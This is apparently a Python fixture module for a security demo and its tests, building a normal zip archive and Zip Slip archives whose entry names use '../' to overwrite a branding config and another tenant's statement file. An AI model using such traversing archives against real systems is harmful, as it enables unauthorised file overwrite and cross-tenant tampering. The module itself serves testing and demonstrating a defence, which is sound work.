"""Sample archives used by the demo runner and tests.

Building a zip whose entry name contains ``..`` is not an exploit against anything — it
is the demonstration payload. The secure app rejects it; a later slice shows the
vulnerable app writing it. Keeping the builders here means the demo and the tests share
exactly one definition of each payload.
"""

from __future__ import annotations

import io
import zipfile

#: Name written by the well-formed archive; lands inside the caller's own base.
WELL_FORMED_MEMBER = "statement-2026-08.txt"
WELL_FORMED_BODY = (
    "STATEMENT (synthetic demonstration data)\n"
    "Period : 2026-08\n"
    "File   : statement-2026-08.txt\n"
    "Imported by a well-formed archive.\n"
)

#: The Zip-Slip payload: a traversing entry aimed at the shared branding config.
TRAVERSING_MEMBER = "../../config/branding.conf"
TRAVERSING_BODY = "[branding]\nfooter = OWNED-BY-TRAVERSAL (demo)\n"


def _zip_of(members: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, body in members.items():
            archive.writestr(name, body)
    return buffer.getvalue()


def well_formed_archive() -> bytes:
    """A one-file archive whose member lands inside the caller's own directory."""
    return _zip_of({WELL_FORMED_MEMBER: WELL_FORMED_BODY.encode()})


def traversing_archive() -> bytes:
    """An archive whose entry name escapes the extraction directory (Zip Slip)."""
    return _zip_of({TRAVERSING_MEMBER: TRAVERSING_BODY.encode()})


# --- Zip-Slip write payload (the two documented write targets) -------------------------
#
# The write escape lands only on these two fixture paths, both inside the disposable
# in-container tree: the branding config the app reads back (impact observable through the
# legitimate summary), and one other tenant's statement document (cross-tenant overwrite).
ATTACKER_FOOTER = "PWNED-BY-ZIP-SLIP (demo)"
ATTACKER_BRANDING = f"[branding]\nfooter = {ATTACKER_FOOTER}\n"
ATTACKER_STATEMENT = "OVERWRITTEN by a cross-tenant Zip-Slip write (synthetic demo).\n"

ZIP_SLIP_BRANDING_ENTRY = TRAVERSING_MEMBER  # "../../config/branding.conf"
ZIP_SLIP_CROSS_TENANT_ENTRY = "../northwind-mills/statement-2026-07.txt"


def zip_slip_write_archive() -> bytes:
    """An archive whose two traversing entries escape to the documented write targets."""
    return _zip_of(
        {
            ZIP_SLIP_BRANDING_ENTRY: ATTACKER_BRANDING.encode(),
            ZIP_SLIP_CROSS_TENANT_ENTRY: ATTACKER_STATEMENT.encode(),
        }
    )
